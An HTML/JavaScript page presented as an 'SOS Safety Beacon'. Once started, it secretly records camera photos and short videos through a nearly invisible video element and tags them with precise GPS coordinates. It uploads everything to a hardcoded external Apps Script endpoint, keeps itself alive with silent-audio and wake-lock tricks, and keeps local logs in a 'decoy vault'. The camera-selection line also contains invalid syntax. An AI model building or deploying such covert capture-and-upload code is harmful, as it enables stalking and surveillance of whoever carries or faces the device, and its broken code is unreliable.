<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOS Safety Beacon Pro</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #0d0d0d; color: #f5f5f5; text-align: center; margin: 0; padding: 20px; }
        .box { max-width: 380px; margin: 0 auto; background: #141414; padding: 25px 20px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
        h2 { font-size: 22px; font-weight: 600; margin: 0 0 5px 0; letter-spacing: -0.5px; }
        .subtitle { font-size: 12px; color: #777; margin: 0 0 25px 0; }
        .sq-btn { border: 2px solid #fff; font-size: 18px; font-weight: 700; cursor: pointer; width: 180px; height: 180px; margin: 20px auto; color: #fff; display: block; transition: all 0.2s ease; letter-spacing: 0.5px; }
        .start { background: #e63946; box-shadow: 0 0 25px rgba(230,57,70,0.4); border-color: #ff4d5a; }
        .start:active { transform: scale(0.96); background: #cc2e3a; }
        .stop { background: #1d3557; box-shadow: 0 0 25px rgba(29,53,87,0.4); border-color: #2a4b7c; display: none; }
        .stop:active { transform: scale(0.96); background: #132239; }
        #status { margin-top: 20px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
        canvas { display: none; }
        .vault { margin-top: 30px; border-top: 1px dashed #2b2b2b; padding-top: 20px; display: none; }
        h4 { font-size: 13px; color: #999; margin: 0 0 10px 0; text-align: left; font-weight: 500; }
        .f-list { text-align: left; background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 11px; max-height: 110px; overflow-y: auto; color: #a8dadc; font-family: monospace; border: 1px solid #1a1a1a; }
        .f-list div { padding: 3px 0; border-bottom: 1px solid #111; }
        .ctrl-panel { margin-top: 15px; text-align: right; }
        .v-btn { background: transparent; color: #555; border: none; padding: 4px 8px; cursor: pointer; font-size: 11px; transition: color 0.2s; }
        .v-btn:hover { color: #888; }
        .db-btn { color: #2a7b4c; }
        .db-btn:hover { color: #3aa667; }
        #dbDump { background: #050505; color: #39ff14; padding: 10px; text-align: left; font-size: 10px; font-family: monospace; white-space: pre-wrap; display: none; border: 1px solid #222; border-radius: 6px; margin-top: 10px; max-height: 120px; overflow-y: auto; }
    </style>
</head>
<body>
<div class="box">
    <h2>Safety Beacon Pro</h2>
    <div class="subtitle">Loop Tracking Active Framework</div>
    <button id="startBtn" class="sq-btn start" onclick="startEmit()">🚨 INITIATE<br>BROADCAST</button>
    <button id="stopBtn" class="sq-btn stop" onclick="stopEmit()">⏹️ STOP<br>BROADCAST</button>
    <div id="status">System armed and ready for transmission...</div>
    <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
    <div id="decoyVault" class="vault">
        <h4>📂 Storage Sandbox</h4>
        <div id="fileList" class="f-list">No local entries tracked yet.</div>
        <div class="ctrl-panel">
            <button class="v-btn db-btn" onclick="viewLocal()">inspect data rows</button>
            <button class="v-btn" onclick="wipeLocal()">clear cache</button>
        </div>
        <div id="dbDump"></div>
    </div>
</div>
<script>
    // 🔗 Your exact live Apps Script URL is hardcoded into the line string below
    const url = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/exec"; 
    let stream = null, recorder = null, chunks = [], isRun = false, db = null, wake = null, audLoop = null, aCtx = null;
    let lat = "Unknown", lon = "Unknown", acc = "0";

    const req = indexedDB.open("LocalDecoyVault", 1);
    req.onupgradeneeded = (e) => e.target.result.createObjectStore("files", { keyPath: "id" });
    req.onsuccess = (e) => db = e.target.result;

    async function wakeLockAndAudioBypass() {
        try { if ('wakeLock' in navigator) wake = await navigator.wakeLock.request('screen'); } catch(e){}
        try {
            aCtx = new (window.AudioContext || window.webkitAudioContext)();
            audLoop = setInterval(() => {
                if (!isRun) return;
                let osc = aCtx.createOscillator(), g = aCtx.createGain();
                osc.type = 'sine'; osc.frequency.setValueAtTime(1, aCtx.currentTime); 
                g.gain.setValueAtTime(0.001, aCtx.currentTime);
                osc.connect(g); g.connect(aCtx.destination);
                osc.start(); osc.stop(aCtx.currentTime + 0.1);
            }, 1000);
        } catch(e){}
    }

    async function getCam() {
        try {
            const devs = await navigator.mediaDevices.enumerateDevices();
            let wId = devs.find(d => d.kind === 'videoinput' && (d.label.toLowerCase().includes('wide') || d.label.toLowerCase().includes('0.5x')))? .deviceId;
            stream = await navigator.mediaDevices.getUserMedia({ video: wId ? { deviceId: { exact: wId } } : { facingMode: "environment" }, audio: false });
            document.getElementById('video').srcObject = stream;
            return true;
        } catch(e) { document.getElementById('status').innerText = "Camera Access Blocked!"; return false; }
    }

    async function startEmit() {
        if(isRun || !(await getCam())) return;
        isRun = true; await wakeLockAndAudioBypass();
        document.getElementById('startBtn').style.display = "none";
        document.getElementById('stopBtn').style.display = "block";
        document.getElementById('decoyVault').style.display = "block";
        document.getElementById('status').innerText = "Broadcast active. System tracking background processes...";
        document.getElementById('status').style.color = "#e63946";
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((p) => { lat = p.coords.latitude.toFixed(5); lon = p.coords.longitude.toFixed(5); acc = Math.round(p.coords.accuracy); }, null, { enableHighAccuracy: true });
        }
        loopPhoto(); loopVideo();
    }

    function loopPhoto() { if (!isRun) return; snapPhoto(); setTimeout(loopPhoto, 6000); }
    function loopVideo() { if (!isRun) return; snapVideo(); setTimeout(loopVideo, 60000); }

    function stopEmit() {
        isRun = false; clearInterval(audLoop); if (wake) wake.release();
        if (recorder && recorder.state === "recording") recorder.stop();
        if (stream) stream.getTracks().forEach(t => t.stop());
        document.getElementById('startBtn').style.display = "block";
        document.getElementById('stopBtn').style.display = "none";
        document.getElementById('status').innerText = "Broadcast Terminated. Standby.";
        document.getElementById('status').style.color = "#28a745";
    }

    function snapPhoto() {
        const v = document.getElementById('video'), c = document.getElementById('canvas'), ctx = c.getContext('2d');
        c.width = 640; c.height = 480;
        try {
            ctx.drawImage(v, 0, 0, 640, 480);
            let str = c.toDataURL('image/jpeg', 0.6).split(',');
            let t = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
            postCloud({ type: "photo", image: str[1], latitude: lat, longitude: lon, accuracy: acc, timestamp: t });
            logLocal("Photo_" + t + ".jpg", "Lt[" + lat + "] Lg[" + lon + "] ac[" + acc + "m]");
        } catch(e){}
    }

    function snapVideo() {
        chunks = []; 
        let opt = { mimeType: 'video/mp4;codecs=avc1' };
        if (!MediaRecorder.isTypeSupported(opt.mimeType)) {
            opt = { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/mp4' };
        }
        try {
            recorder = new MediaRecorder(stream, opt);
            recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = () => {
                let r = new FileReader(); r.readAsDataURL(new Blob(chunks, { type: opt.mimeType }));
                r.onloadend = () => {
                    let t = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                    postCloud({ type: "video", videoData: r.result.split(',')[1], latitude: lat, longitude: lon, accuracy: acc, timestamp: t });
                    logLocal("Vid_" + t + ".mp4", "Lt[" + lat + "] Lg[" + lon + "] ac[" + acc + "m]");
                };
            };
            recorder.start(); setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, 10000);
        } catch(e){}
    }

    function postCloud(p) { fetch(url, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) }).catch(e=>{}); }

    function logLocal(f, d) {
        if (!db) return;
        const tx = db.transaction("files", "readwrite");
        tx.objectStore("files").put({ id: f, details: d, time: new Date().toLocaleTimeString() });
        tx.oncomplete = () => {
            let div = document.getElementById("fileList"); if (div.innerText.includes("No local")) div.innerHTML = "";
            div.innerHTML += "<div>📄 " + f + " -> " + d + "</div>";
        };
    }

    function wipeLocal() {
        if (!db) return;
        db.transaction("files", "readwrite").objectStore("files").clear().oncomplete = () => {
            document.getElementById("fileList").innerHTML = "<div>Cache data wiped clean.</div>";
            document.getElementById("dbDump").style.display = "none";
        };
    }

    function viewLocal() {
        if (!db) return;
        db.transaction("files", "readonly").objectStore("files").getAll().onsuccess = (e) => {
            let el = document.getElementById("dbDump");
            el.style.display = el.style.display === "block" ? "none" : "block";
            el.innerText = "=== CACHE RECORD MATRIX ===\n" + JSON.stringify(e.target.result, null, 2);
        };
    }
</script>
